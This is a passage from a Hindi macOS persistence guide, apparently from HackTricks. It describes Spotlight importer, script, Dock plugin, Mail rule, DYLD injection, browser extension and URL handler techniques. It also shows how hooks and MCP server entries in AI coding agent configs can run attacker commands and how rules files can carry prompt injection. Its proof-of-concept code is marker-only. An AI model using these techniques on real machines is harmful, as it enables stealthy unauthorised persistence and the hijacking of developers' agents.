  - Root आवश्यक है
- `Some.app/Contents/Library/Spotlight/`
  - **Trigger**: Spotlight plugin द्वारा प्रबंधित extension वाली नई file बनाई जाती है।
  - नया app आवश्यक है

#### Description & Exploitation

Spotlight, macOS का built-in search feature है, जिसे उपयोगकर्ताओं को **अपने कंप्यूटर पर मौजूद data तक तेज़ और व्यापक पहुँच** देने के लिए बनाया गया है।\
इस तेज़ search क्षमता को सक्षम करने के लिए, Spotlight एक **proprietary database** रखता है और **अधिकांश files को parse** करके एक index बनाता है, जिससे file names और उनकी content—दोनों में तेज़ी से search की जा सकती है।<sup>[[25]](#references)</sup>

Spotlight का मूल तंत्र 'mds' नामक एक central process पर आधारित है, जिसका अर्थ **'metadata server'** है। यह process पूरे Spotlight service को नियंत्रित करता है। इसके साथ कई 'mdworker' daemons होते हैं, जो अलग-अलग file types को index करने जैसे कई maintenance tasks करते हैं (`ps -ef | grep mdworker`)। ये tasks Spotlight importer plugins, या **".mdimporter bundles**", के ज़रिए संभव होते हैं, जिनकी मदद से Spotlight विविध file formats की content को समझ और index कर पाता है।

Plugins या **`.mdimporter`** bundles पहले बताए गए स्थानों पर मौजूद होते हैं। एक नए bundle को खोजा जाना और किसी file type से match करना ज़रूरी है, और Spotlight को वास्तव में उससे match होने वाली file को index करना चाहिए; केवल bundle copy करने से यह साबित नहीं होता कि वह load हो गया है। [Apple's MDImporter reference](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) के अनुसार, loading किसी योग्य बदली हुई file से जुड़ी होती है। macOS 26 पर Spotlight importer execution का यहाँ परीक्षण नहीं किया गया।

चल रहे सभी loaded `mdimporters` को इस तरह **ढूँढा जा सकता है**:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

और उदाहरण के लिए **/Library/Spotlight/iBooksAuthor.mdimporter** का उपयोग इस प्रकार की फ़ाइलों (अन्य के साथ extensions `.iba` और `.book`) को parse करने के लिए किया जाता है:

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> यदि आप अन्य `mdimporter` का Plist जाँचते हैं, तो हो सकता है कि आपको **`UTTypeConformsTo`** एंट्री न मिले। ऐसा इसलिए है क्योंकि यह एक built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) है और इसमें extensions निर्दिष्ट करने की आवश्यकता नहीं होती।
>
> इसके अलावा, System के default plugins को हमेशा प्राथमिकता मिलती है, इसलिए attacker केवल उन files तक पहुँच सकता है जिन्हें Apple के अपने `mdimporters` अन्यथा index नहीं करते।

अपना importer बनाने के लिए, आप इस project से शुरुआत कर सकते हैं: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), फिर उसका नाम बदलें, **`CFBundleDocumentTypes`** बदलें और **`UTImportedTypeDeclarations`** जोड़ें, ताकि यह उस extension को support करे जिसे आप support करना चाहते हैं, और उन्हें **`schema.xml`** में प्रतिबिंबित करें।\
इसके बाद, **`GetMetadataForFile`** function का code **बदलें**, ताकि संसाधित extension वाली file बनते ही आपका payload execute हो।

अंत में, अपना नया **`.mdimporter` build करके** उसे पहले बताए गए तीन स्थानों में से किसी एक पर copy करें। आप **logs monitor करके** या **`mdimport -L`** चलाकर जाँच सकते हैं कि यह load हुआ है या नहीं।

> [!TIP]
> भले ही importer sandbox बहुत प्रतिबंधात्मक हो, `mdworker` files को **privileged read access** के साथ index करता है। इसलिए, एक malicious `.mdimporter`, TCC-protected locations (Downloads, Pictures, Desktop, …) के अंदर मौजूद files का *content* पढ़ सकता है और बिना किसी TCC prompt के जुटाया गया metadata बाहर भेज सकता है — यह **"Sploitlight" TCC bypass (CVE-2025-31199)** है, जिसे macOS Sequoia 15.4 में patch किया गया था।<sup>[[55]](#references)</sup>

system logs के बजाय **Darwin notification names** में protected bytes रखने की macOS 26 की अलग technique के लिए, देखें [Spotlight importer leakage via Darwin notification names](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names)।<sup>[[57]](#references)</sup>

### ~~Preference Pane~~

> [!CAUTION]
> ऐसा नहीं लगता कि यह अब काम कर रहा है।

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Sandbox bypass करने में उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - इसके लिए user की एक विशेष कार्रवाई आवश्यक है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### विवरण

ऐसा नहीं लगता कि यह अब काम कर रहा है।<sup>[[26]](#references)</sup>

### Application Script Files

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Sandbox bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन targeted application का installed होना और victim द्वारा उसका चलाया/उपयोग किया जाना आवश्यक है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

एक **interpreted script जिसे installed application या tool वास्तव में execute करता है** और जिसे actor modify कर सकता है। File की permissions और उसे call करने वाले path की पुष्टि करें; केवल `.sh` या `.py` file मिल जाना पर्याप्त नहीं है। Apple की [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) के अनुसार, signed app bundles scripts सहित resources को seal करते हैं। Bundle के अंदर की script edit करने से वह seal टूट जाती है और bundle validate होने पर इसका पता चल सकता है या इसे block किया जा सकता है। Homebrew के launcher जैसी external script में signing और trust का व्यवहार अलग होता है। Writeup के ऐतिहासिक उदाहरणों में शामिल हैं:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – पुराने Sublime Text releases में इस्तेमाल होने वाली script; installed version के लिए file और उसके startup में उपयोग की पुष्टि करनी चाहिए। Test Mac पर यह मौजूद नहीं थी।
- **`/opt/homebrew/bin/brew`** (Apple Silicon) या **`/usr/local/bin/brew`** (Intel) – उस `brew` path को invoke करने पर execute होने वाला Bash launcher, यदि installed हो और actor द्वारा writable हो। Test Mac पर `/opt/homebrew/bin/brew` एक writable Bash script थी; यह केवल स्थानीय observation है, Homebrew permissions का सामान्य नियम नहीं।
- Python app bundle के अंदर IDLE की `idlemain.py` – इसे लिखने के लिए admin permission की आवश्यकता हो सकती है, लेकिन यह IDLE user की identity के साथ चलती है।
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – एक ऐतिहासिक root-run shell script, जब संबंधित `org.wireshark.ChmodBPF` launchd job installed हो। Test Mac पर script और job मौजूद नहीं थे।

#### विवरण और Exploitation

कुछ tools और apps runtime पर interpreted scripts execute करते हैं। यदि signature validation, quarantine और अन्य checks अनुमति दें, तो writable script में जोड़े गए commands तब execute हो सकते हैं जब उसका विशिष्ट caller अगली बार चले। मूल research में 2019 के कई installations दिखाए गए थे; target version पर उनके paths और triggers फिर से जाँचें।<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

इस copy test में macOS 26.5.2 पर `marker fired: True` मिला; मूल launcher को छुआ तक नहीं गया। यह साबित करता है कि insertion point copy में execute होता है, न कि यह कि modified signed app bundle या वास्तविक Homebrew installation हर launch check में सफल होगी।

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- sandbox bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - इसके लिए ज़रूरी है कि plug-in घोषित करने वाले app को Dock खोजे/रजिस्टर करे और प्रोसेस करे
  - Plugin एक **Apple-signed** helper में load होता है, जिसके पास app-sandbox entitlement नहीं है और जिसमें **library validation disabled** है। उद्धृत शोध में यह helper Background Task Management UI में नहीं दिखा था; लक्ष्य release पर इसकी दृश्यता जाँची जानी चाहिए।
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, app के `Info.plist` में **`NSDockTilePlugIn`** key से संदर्भित; plugin का अपना `Info.plist` **`NSPrincipalClass`** सेट करता है।

#### विवरण और Exploitation

जब कोई app `NSDockTilePlugIn` घोषित करता है, तो Dock संदर्भित bundle को login के समय या उसका tile जोड़े जाने पर **`com.apple.dock.external.extra`** XPC helper (`...extra.arm64` Apple Silicon पर) में load कर सकता है; app को खुद launch होना ज़रूरी नहीं है। इसके लिए macOS द्वारा app को खोजा/रजिस्टर किया जाना और स्वीकार किया जाना ज़रूरी है। Helper **Apple-signed** है, उसमें `com.apple.security.app-sandbox` entitlement नहीं है और उसमें `com.apple.security.cs.disable-library-validation` है। Load होने पर principal class का **`setDockTile:`** method invoke किया जाता है; वहाँ से यह बाद की घटनाओं के लिए distributed notifications (जैसे `com.apple.screenIsLocked`) की सदस्यता ले सकता है।<sup>[[38]](#references)</sup>

macOS 26.5.2 पर, read-only `codesign` inspection ने helper के Apple signature और entitlements की पुष्टि की, और कई installed apps में `NSDockTilePlugIn` घोषित था। उस Mac पर कोई नया plug-in install या load नहीं किया गया, इसलिए उस release पर नए लिखे गए bundle का execution अभी जाँचा नहीं गया है।

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

विवरण: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - Widget extension **अपने अलग process** में चलता है, और इसे जोड़ने पर Background Task Management alert नहीं आता
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Config plist, TCC-protected container के अंदर रहता है, इसलिए इसे बाहर से edit करने के लिए Full Disk Access या TCC bypass की ज़रूरत होती है

#### Location

- Widget extension bundle: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Active/registered widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (keys `widgets.instances` और `widgets.widgets`)

#### Description & Exploitation

किसी app के अंदर शामिल WidgetKit extension, Notification Center द्वारा managed **अपने अलग process** में चलता है। `widgets.instances` में एक instance register करने से (`INIntent` data वाला base64 `NSKeyedArchiver`-encoded `CHSWidget` blob) और NotificationCenter को restart करने से widget लोड होता है और उसका `TimelineProvider`/intent code execute होता है।<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Rules (Run AppleScript)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Mail.app में कोई account configured होना चाहिए और वह चल रहा होना चाहिए; trigger एक inbound email है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Mail के बाहर से rules/scripts edit करने के लिए Mail बंद करना और आधुनिक macOS पर Full Disk Access देना ज़रूरी हो सकता है

#### स्थान

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (local rules; Sonoma/Sequoia पर `V10`, नए संस्करणों पर `V11`+)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud-synced rules, जिन्हें प्राथमिकता मिलती है)
- Rule enablement: **`RulesActiveState.plist`**; AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### विवरण और शोषण

Apple Mail के **rule** में *"Run AppleScript"* action हो सकता है। किसी crafted **subject line** से मेल खाने वाला rule जोड़कर और उसे attacker script चलाने के लिए सेट करके, adversary Mail के context में **remotely-triggerable, stealthy** code execution हासिल कर सकता है—जब भी वह खास email आता है। यह ऐसा vector है जो कई persistence scanners से बच निकलता है, क्योंकि कोई LaunchAgent/Login Item नहीं बनाया जाता।<sup>[[42]](#references)</sup> Trigger email को **delete** करने के लिए भी rule सेट करने से सबूत छिप जाता है। Defenders इसे सीधे खोज सकते हैं:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

Writeup: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle)
  - आधुनिक macOS में System Settings → *Device Management* में **मैन्युअल user approval** ज़रूरी है (`profiles install` को चुपचाप करना MDM के बाहर अब संभव नहीं है)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- Installed profiles **`/Library/Managed Preferences/`** और **`/var/db/ConfigurationProfiles/`** में रहते हैं; profile एक XML plist है जिसमें `PayloadContent` array होता है।

#### विवरण और Exploitation

`.mobileconfig` सीधे code-execution primitive नहीं है, लेकिन यह **trusted root CA** (`com.apple.security.root`), **global या PAC proxy** (`com.apple.proxy.*`), **managed preferences** (`com.apple.ManagedClient.preferences`) या restrictions जैसी configuration को persist कर सकता है। macOS 10.15 और बाद के संस्करणों में, Apple की [`PayloadRemovalDisallowed` परिभाषा](https://developer.apple.com/documentation/devicemanagement/toplevel) के अनुसार, **मैन्युअल रूप से installed** profile पर इसे `true` सेट करने से, removal-password payload के बिना, profile हटाने के लिए **administrator authentication** ज़रूरी हो जाता है; इससे वह profile पूरी तरह से हटाया न जा सकने वाला नहीं बनता। MDM-installed profiles के management और removal के नियम अलग हैं।<sup>[[44]](#references)</sup>

> [!WARNING]
> एक साधारण configuration profile में ऐसा **कोई payload type नहीं है जो मनमाना `LaunchDaemon`/`LaunchAgent` डाल सके**। इस तरह daemon install करने के लिए पूर्ण **MDM enrollment** के साथ management agent/script चाहिए — `.mobileconfig` को launchd delivery mechanism न समझें।

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- Sandbox को bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle)
  - dyld, SIP/platform binaries, hardened-runtime apps और setuid targets के लिए `DYLD_*` को **हटा देता है**, इसलिए यह केवल unprotected processes में inject करता है और SIP/the hardened runtime को bypass **नहीं** करता
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- भरोसेमंद तरीका: किसी malicious `LaunchAgent`/`LaunchDaemon` plist के अंदर **`EnvironmentVariables`** dict (login/boot पर चलता है)
- अनुपयोगी/ऐतिहासिक (केवल रिपोर्ट के लिए): **`~/.MacOSX/environment.plist`** (10.8 में हटाया गया) और **`/etc/launchd.conf`** (10.10 में हटाया गया)

#### विवरण और Exploitation

अगर कोई attacker victim process के environment में `DYLD_INSERT_LIBRARIES` डाल सके, तो dyld उस process में attacker की dylib load करता है (उसका constructor चलता है)। Persistent variant इस variable को LaunchAgent में embed करता है, ताकि job के हर launch पर यह फिर से inject हो। ध्यान दें कि modern macOS पर `launchctl setenv DYLD_*` को filter किया जाता है, इसलिए इसे plist में embed करें।<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

dylib injection/hijacking की पूरी प्रक्रिया के लिए देखें:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLIs (hooks, MCP servers, rules files)

लेख: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - इसके लिए developer को संबंधित agent का उपयोग करना होगा। जब agent उसका configuration स्वीकार करता है, तो startup commands उस user के privileges के साथ चलते हैं; workspace trust और MCP approval, product और session mode के अनुसार अलग-अलग होते हैं।
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (user के रूप में चलता है; terminal/agent के पास पहले से जो भी access होता है, वही इसके पास भी होता है)

#### स्थान

Explicit hook और MCP configuration files के कारण **developer के tool का उपयोग करने पर shell commands या child processes चल सकते हैं** — या तो per-user global file से (persistence), या repo में commit की गई file से (supply-chain)। `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` और editor rules **agent के लिए instructions हैं**, जिन्हें पढ़ने पर shell execution की गारंटी नहीं होती; इनका प्रभाव agent के व्यवहार और tool permissions पर निर्भर करता है। हर product के मौजूदा trust और approval rules जाँचें।

- **Claude Code**
  - `~/.claude/settings.json`, project `.claude/settings.json`, `.claude/settings.local.json`, और केवल root के लिए **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM/managed settings को user **override नहीं कर सकता** → मजबूत persistence)
  - `hooks` object — events `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — हर event एक shell `command` चलाता है
  - `statusLine.command` — status line दिखाने के लिए चलाया जाने वाला shell command (हर session में)
  - `~/.claude.json` / project `.mcp.json` में MCP servers — `command`+`args` को child processes के रूप में launch किया जाता है
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — ऐसी instructions जो prompt injection की कोशिश कर सकती हैं; यह agent के व्यवहार और tool permissions पर निर्भर करता है
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` को children के रूप में launch किया जाता है); `AGENTS.md` project instructions
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … commands चलाते हैं); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### विवरण और Exploitation

यदि कोई actor account की user-global settings में बदलाव कर सकता है, तो उसके hook या MCP commands उस account के तहत भविष्य के sessions में चल सकते हैं। Repository-controlled config एक अलग मामला है: [Claude Code के मौजूदा security docs](https://code.claude.com/docs/en/security) में interactive workspace trust dialog और project `.mcp.json` servers के लिए अलग approval prompt का वर्णन है। [इसके permission matrix](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) के अनुसार, parent folder को trust करने के बाद hooks चल सकते हैं, और `claude -p`/SDK sessions में interactive trust prompt नहीं दिखता; इन noninteractive modes में project MCP servers बिना approval prompt के connect होते हैं। CVE-2025-59536 के रूप में रिपोर्ट किया गया pre-trust project hook bypass [2025 में ठीक कर दिया गया था](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); इसे मौजूदा default behavior न मानें। Delivery vectors में compromised repository या malicious installer शामिल हो सकते हैं। Rules-file prompt injection explicit hook की तुलना में कम निश्चित होता है और फिर भी tool approvals पर निर्भर करता है।<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

उदाहरण के लिए user-global Claude Code settings; testing के समय इसे केवल disposable account में रखें:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

उदाहरण के तौर पर user-global Codex MCP कॉन्फ़िगरेशन:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Cursor hook configuration का उदाहरण; इसका उपयोग करने से पहले इंस्टॉल किए गए संस्करण का schema जाँचें:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### ब्राउज़र एक्सटेंशन (Chromium: Chrome / Brave / Edge)

लेख: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [ExtensionInstallForcelist abuse on macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - इसके लिए समर्थित ब्राउज़र और इंस्टॉल किया हुआ, सक्षम एक्सटेंशन चाहिए। macOS पर External Extensions के लिए उपयोगकर्ता की पुष्टि आवश्यक है; managed force-install के लिए लागू enterprise policy चाहिए।
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> यह **native messaging hosts** से अलग है (ऊपर *Chrome native messaging hosts* सेक्शन देखें)। यहाँ persistence स्वयं **auto-installed extension** है।

#### स्थान

- **External Extensions JSON** (ब्राउज़र शुरू होने पर खोजी जाती है, फिर macOS पर enable prompt दिखता है):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (प्रति-उपयोगकर्ता) या `/Library/Application Support/Google/Chrome/External Extensions/` (सभी उपयोगकर्ताओं के लिए)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- managed preferences / configuration profile के ज़रिए **Enterprise-policy force-install**:
  - `com.google.Chrome` key `ExtensionInstallForcelist` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), जिसे `/Library/Managed Preferences/` या इंस्टॉल किए गए `.mobileconfig` से पढ़ा जाता है

#### विवरण और Exploitation

ये इंस्टॉलेशन के दो अलग-अलग तरीके हैं। Chrome का [external-install documentation](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) कहता है कि *External Extensions* फ़ाइल के ज़रिए प्रस्तुत किए गए एक्सटेंशन को **Windows और macOS उपयोगकर्ताओं को स्वीकार करके सक्षम करना होगा**; केवल उस JSON फ़ाइल को लिख देने से यह execute नहीं होता। macOS पर सभी उपयोगकर्ताओं के लिए इंस्टॉलेशन हेतु, Chrome यह भी मांगता है कि External Extensions फ़ाइल को unprivileged संशोधन से सुरक्षित रखा जाए। managed `ExtensionInstallForcelist` या `ExtensionSettings` policy, उपयोगकर्ता की सहमति के बिना एक्सटेंशन इंस्टॉल और pin कर सकती है; [Google's Mac policy guide](https://support.google.com/chrome/a/answer/7517624) managed configuration का वर्णन करती है और कहती है कि उपयोगकर्ता force-installed एक्सटेंशन हटा नहीं सकते। यह policy deployment का तरीका है, प्रति-उपयोगकर्ता `defaults write` का shortcut नहीं।<sup>[[49]](#references)</sup>

> [!WARNING]
> macOS पर, *External Extensions* JSON manifest में **Chrome Web Store** का update URL होना चाहिए, local CRX का नहीं। Managed policy deployment की अपनी enterprise prerequisites हैं और इसमें managed self-hosted update URL की अनुमति हो सकती है। Test profile में local unpacked extension के लिए Chrome का developer-mode `--load-extension=/path` switch एक अलग तरीका है और इससे External Extensions JSON फ़ाइल अपने-आप execute नहीं होती। `Secure Preferences` में लिखने को इन दोनों documented registration तरीकों के बराबर न मानें।

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

उस disposable account में Chrome शुरू करें और enable prompt देखें; user के स्वीकार करने के बाद extension का अपना व्यवहार ही execution PoC है। परीक्षण के बाद, manifest हटाएँ और उस profile में extension को disable/uninstall करें। Research Mac के active Chrome profile में इस तरीके को आज़माया नहीं गया था। वहाँ managed-policy route भी लागू नहीं किया गया था।

Force-install और External Extensions, **Chrome Web Store** extension IDs को संदर्भित करते हैं; HMAC-signed `Secure Preferences` को संपादित करके किसी local extension को चुपचाप inject करने की निम्न-स्तरीय तरकीब और Chromium-process के अन्य दुरुपयोगों के लिए देखें:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Scheme और File-Type Handlers (LaunchServices)

लेख: [Custom URL Schemes के ज़रिए Remote Mac Exploitation (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - Trigger तब होता है जब victim किसी link (जैसे Chrome/Brave/Safari में) पर click करता है या registered type की file खोलता है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- App bundle का `Info.plist`, जिसमें **`CFBundleURLTypes`/`CFBundleURLSchemes`** (custom URL scheme) या **`CFBundleDocumentTypes`** (file extension/UTI) घोषित हो
- Per-user प्रभावी defaults **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** में दिख सकते हैं (`LSHandlers` array)। URL-scheme default चुनने के लिए Apple का supported API `LSSetDefaultHandlerForURLScheme` है; सीधे उस plist में लिखना, registration या cache update करने का documented तरीका नहीं है।

#### विवरण और Exploitation

Launch Services, registered app के `Info.plist` से URL-scheme और document claims प्राप्त करता है। [Apple की registration guide](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) के अनुसार, registration तब हो सकता है जब Finder app को खोजे, boot या login के समय, या किसी explicit registration API के ज़रिए; किसी स्थान पर app लिखना तत्काल trigger होने की गारंटी नहीं देता। Registration के बाद, matching URL या document खोलने से चुना गया handler app launch हो सकता है, जो user की default-handler choice और macOS की सामान्य launch checks के अधीन है। Supported `LSSetDefaultHandlerForURLScheme` API, user की पसंद का URL handler बदलता है; इससे नई डाली गई app अपने-आप execute नहीं होती।<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

macOS 26.5.2 research Mac पर कोई app register नहीं किया गया और handler preference में कोई बदलाव नहीं किया गया। किसी वास्तविक handler की जाँच करने के लिए, एक disposable user account इस्तेमाल करें, unique scheme वाला marker-only app register करें, उसका URL invoke करें, फिर app और उसका registration हटा दें।

File-extension और URL-scheme handlers को विस्तार से enumerate/abuse करने के लिए देखें:

